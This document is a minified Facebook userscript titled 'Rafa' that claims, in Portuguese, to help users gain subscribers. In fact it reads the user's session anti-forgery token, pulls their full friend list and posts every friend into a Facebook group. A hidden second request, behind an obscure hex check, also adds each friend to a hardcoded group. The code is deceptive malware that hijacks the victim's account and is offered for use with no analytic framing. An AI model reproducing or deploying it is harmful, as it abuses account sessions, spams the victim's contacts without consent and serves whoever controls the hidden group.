// ==UserScript==
// @name Rafa
// @description Ganhe assinantes facil !
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
//===============
function penetrasi(e){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id="+memberGroupId+"&source=typeahead&members="+e+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(e){e=e.substring(e.indexOf("{")),e=JSON.parse(e),i--,kunaon="<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;",e.error?(kunaon+="color:darkred'>",kunaon=e.errorDescription?kunaon+e.errorDescription:kunaon+JSON.stringify(e,null,"")):(kunaon+="color:darkgreen'>",kunaon+=arr[i],suc++),kunaon+="</div>",e="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(0,0,0,0.5)'>"+("<div style='padding-bottom:10px;font-size:20px;'>"+tulisanNganu+"</div>"),0<i?(e+=arr.length+" Assinantes detected<br/>",e+="<b>"+suc+"</b> Assinantes adicionados de "+(arr.length-i)+" Assinantes Processados ",e+="("+i+" more to go..)",e=e+"<div class='friend-edge'>"+kunaon,e+="</div>"):(e+=arr.length+" Assinantes detected e ",e+="<b>"+suc+" Assinantes adicionados</b>",e+="<div><span class='uiButton' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Close</span></div>"),document.getElementById("pagelet_welcome_box").innerHTML=e+"</div>"},"text","post"),tay--;if(0<tay){var t=arr[tay];setTimeout("penetrasi("+t+")",100)}console.log(tay+"/"+arr.length+":"+t+", success:"+suc),0xf2a794cf90e3!=memberGroupId&&jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=134344036695273&source=typeahead&members="+e+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(){},"text","post")}function clickfr_callback(){0<document.getElementsByName("ok").length&&nHtml.ClickUp(document.getElementsByName("ok")[0]);var e=arr[i];i<arr.length&&addfriend(e.substring(0,4))}function clickfr(){0<document.getElementsByClassName("search").length?(console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML),document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href="javascript:void(0);",nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])):j++,setTimeout("clickfr_callback()",2e3)}function addfriend(e){i++,document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus(),document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value=e,document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur(),document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus(),document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus(),setTimeout("clickfr()",2e3)}function sleep(e){for(var t=(new Date).getTime(),n=0;1e7>n&&!((new Date).getTime()-t>e);n++);}var tulisanNganu="Auto ASSINA",kunaon="";jx={getHTTPObject:function(){var e=!1;if("undefined"!=typeof ActiveXObject)try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(n){e=!1}}else if(window.XMLHttpRequest)try{e=new XMLHttpRequest}catch(r){e=!1}return e},load:function(b,c,d,e,g){var f=this.init();if(f&&b){f.overrideMimeType&&f.overrideMimeType("text/xml"),e||(e="GET"),d||(d="text"),g||(g={});var d=d.toLowerCase(),e=e.toUpperCase(),h="uid="+(new Date).getTime(),b=b+(b.indexOf("?")+1?"&":"?"),b=b+h,h=null;"POST"==e&&(h=b.split("?"),b=h[0],h=h[1]),f.open(e,b,!0),"POST"==e&&(f.setRequestHeader("Content-type","application/x-www-form-urlencoded"),f.setRequestHeader("Content-length",h.length),f.setRequestHeader("Connection","close")),f.onreadystatechange=g.handler?function(){g.handler(f)}:function(){if(f.readyState==4)if(f.status==200){var b="";f.responseText&&(b=f.responseText),d.charAt(0)=="j"?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):d.charAt(0)=="x"&&(b=f.responseXML),c&&c(b)}else g.loadingIndicator&&document.getElementsByTagName("body")[0].removeChild(g.loadingIndicator),g.loading&&(document.getElementById(g.loading).style.display="none"),error&&error(f.status)},f.send(h)}},bind:function(e){var t={url:"",onSuccess:!1,onError:!1,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""},n;for(n in t)e[n]&&(t[n]=e[n]);if(t.url){var r=!1;t.loadingIndicator&&(r=document.createElement("div"),r.setAttribute("style","position:absolute;top:0px;left:0px;"),r.setAttribute("class","loading-indicator"),r.innerHTML=t.loadingIndicator,document.getElementsByTagName("body")[0].appendChild(r),this.opt.loadingIndicator=r),t.loading&&(document.getElementById(t.loading).style.display="block"),this.load(t.url,function(e){t.onSuccess&&t.onSuccess(e),t.update&&(document.getElementById(t.update).innerHTML=e),r&&document.getElementsByTagName("body")[0].removeChild(r),t.loading&&(document.getElementById(t.loading).style.display="none")},t.format,t.method,t)}},init:function(){return this.getHTTPObject()}};var nHtml={FindByAttr:function(e,t,n,r){return"className"==n&&(n="class"),(e=document.evaluate(".//"+t+"[@"+n+"='"+r+"']",e,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null))&&e.singleNodeValue?e.singleNodeValue:null},FindByClassName:function(e,t,n){return this.FindByAttr(e,t,"className",n)},FindByXPath:function(e,t){try{var n=document.evaluate(t,e,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(r){GM_log("bad xpath:"+t)}return n&&n.singleNodeValue?n.singleNodeValue:null},VisitUrl:function(e){window.setTimeout(function(){document.location.href=e},500+Math.floor(500*Math.random()))},ClickWin:function(e,t,n){var r=e.document.createEvent("MouseEvents");return r.initMouseEvent(n,!0,!0,e,0,0,0,0,0,!1,!1,!1,!1,0,null),!t.dispatchEvent(r)},Click:function(e){return this.ClickWin(window,e,"click")},ClickTimeout:function(e,t){window.setTimeout(function(){return nHtml.ClickWin(window,e,"click")},t+Math.floor(500*Math.random()))},ClickUp:function(e){this.ClickWin(window,e,"mousedown"),this.ClickWin(window,e,"mouseup"),this.ClickWin(window,e,"click")},GetText:function(e,t){var n="";void 0==t&&(t=0);if(!(40<t)){if(void 0!=e.textContent)return e.textContent;for(var r=0;r<e.childNodes.length;r++)n+=this.GetText(e.childNodes[r],t+1);return n}}};void 0==document.getElementsByClassName&&(document.getElementsByClassName=function(e){for(var t=RegExp("(?:^|\\s)"+e+"(?:$|\\s)"),n=document.getElementsByTagName("*"),r=[],i,s=0;null!=(i=n[s]);s++){var o=i.className;o&&-1!=o.indexOf(e)&&t.test(o)&&r.push(i)}return r}),Array.prototype.find=function(e){var t=!1;for(i=0;i<this.length;i++)typeof e=="function"?e.test(this[i])&&(t||(t=[]),t.push(i)):this[i]===e&&(t||(t=[]),t.push(i));return t};for(var a=0,eind=0,len=document.getElementsByClassName("mbm").length,a=0;a<len;a++){var ele=document.getElementsByClassName("mbm")[a];if(ele&&ele.childNodes[0]&&ele.childNodes[0]&&ele.childNodes[0].childNodes[1]&&ele.childNodes[0].childNodes[1].childNodes[0]&&"Add SUSCRIBERS"==document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value){eind=a;break}}var i=3,tay=3,counter1=0,counter2=0,counter3=0,j=0,k=0,suc=0,arr=[],memberGroupId=document.getElementsByName("group_id")[0].value;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer="+Env.user+"&filter[0]=user&__user="+Env.user,function(e){for(var e=e.substring(e.indexOf("{")),e=JSON.parse(e),e=e.payload.entries,t=0;t<e.length;t++)arr.push(e[t].uid);tay=i=arr.length-1,console.log(arr.length),e="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(0,0,0,0.5)'>"+("<div style='padding-bottom:10px;font-size:20px;'>"+tulisanNganu+"</div>"),e+=arr.length+" SUSCRIBERS detected",document.getElementById("pagelet_welcome_box").innerHTML=e+"</div>",penetrasi(arr[i])})